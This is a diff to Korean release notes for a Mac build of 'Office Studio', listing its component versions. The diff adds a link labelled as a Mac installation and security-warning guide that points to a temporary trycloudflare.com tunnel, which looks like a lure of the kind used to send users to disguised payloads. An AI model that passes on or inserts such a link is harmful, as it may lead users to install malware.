@@ -1,5 +1,7 @@
 Office Studio 1.0.0 Mac 배포입니다. Apple Silicon(M1 이상) · macOS 12 이상에서 사용합니다.
 
+[Mac 설치·보안 경고 안내](https://sentence-durable-databases-toys.trycloudflare.com/s/7ef9c9402c857485a69bb9e8e0c441f57e1025bc8dd9d002)
+
 - Sheet Studio 0.7.23
 - Slide Studio 1.6.11
 - Word Studio 1.4.5
